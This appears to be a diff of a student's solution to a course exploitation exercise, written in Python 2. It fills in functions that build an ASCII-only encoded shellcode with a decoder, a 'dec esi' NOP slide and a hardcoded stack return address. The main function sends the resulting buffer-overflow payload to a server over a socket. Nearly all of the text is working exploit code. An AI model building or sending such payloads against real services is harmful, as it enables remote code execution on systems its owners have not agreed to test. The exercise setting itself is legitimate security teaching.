@@ -59,10 +59,9 @@ def encode(data):
 def get_decoder(indices):
     '''Return the assembled decoder code.'''
     # TODO: IMPLEMENT THIS FUNCTION
-    decoder_assembly = ""
     create_ff = "push 0; pop ebx; dec ebx;" # insert into ebx the value ff with only ascii chars
     init_edx = "push 0; pop edx;" # initiate edx to zero
-    decoder_assembly += create_ff + init_edx
+    decoder_assembly = create_ff + init_edx
 
     edx_current_value = 0
     for i in indices:
@@ -85,7 +84,20 @@ def get_shellcode():
     '''
     q2_shellcode = get_raw_shellcode()
     # TODO: IMPLEMENT THIS FUNCTION
-    raise NotImplementedError()
+    shellcode_length = len(q2_shellcode) # shellcode length doesn't change after 
+    encoded_shellcode, indices = encode(q2_shellcode)
+    decoder_shellcode = get_decoder(indices)
+    # print len(decoder_shellcode)
+    # print shellcode_length
+
+    init_to_esp = "push esp; pop eax;" # init eax as esp value
+    sub_eax = "push 127; sub eax, [esp]; push 112; sub eax, [esp];" # subtract from esp 239 bytes
+    # after these two lines eax should contains the value 0xbfffe0e1 which is the beginnig of the shellcode
+    init_eax = init_to_esp + sub_eax
+    init_eax_assm = assemble.assemble_data(init_eax)
+    total_shellcode = init_eax_assm + decoder_shellcode + encoded_shellcode
+    # print [hex(struct.unpack("B", b)[0]) for b in init_eax_assm]
+    return total_shellcode
 
 
 @warn_invalid_ascii(lambda x: x[4:-4])
@@ -96,18 +108,35 @@ def get_payload():
     shellcode and the return address.
     '''
     # TODO: IMPLEMENT THIS FUNCTION
-    raise NotImplementedError()
+
+    # new_nop = "inc edi;"
+    # nop = assemble.assemble_data(new_nop)
+    # print [hex(struct.unpack("B", b)[0]) for b in nop]
+
+    desired_shell_length = 1040 # as explained in q1
+    new_nop = '\x4e' # this is the instruction 'dec esi'. we replace our nop with this
+    shellcode = get_shellcode()
+    shellcode_length = len(shellcode)
+    address_to_return = "\x20\xde\xff\xbf" # this is the address in the middle of the NOPs slide
+    # this time our nops slide is short only ~200 bytes so we will jump 100 bytes after the begining of the buffer
+
+    # full structe - slide NOPs, init eax with encoded shellcode address, decoder, shellcode, address to return
+    message = new_nop * (desired_shell_length - shellcode_length) + shellcode + address_to_return
+
+    message_length = len(message)
+    message_length_newtork_order = struct.pack('>L', message_length) # add size as in q1
+
+    return message_length_newtork_order + message # return payoload - message + size
 
 
 def main():
-    get_decoder([1,5,10,12, 22])
-    # payload = get_payload()
-    # conn = socket.socket()
-    # conn.connect((HOST, SERVER_PORT))
-    # try:
-    #     conn.sendall(payload)
-    # finally:
-    #     conn.close()
+    payload = get_payload()
+    conn = socket.socket()
+    conn.connect((HOST, SERVER_PORT))
+    try:
+        conn.sendall(payload)
+    finally:
+        conn.close()
 
 
 if __name__ == '__main__':
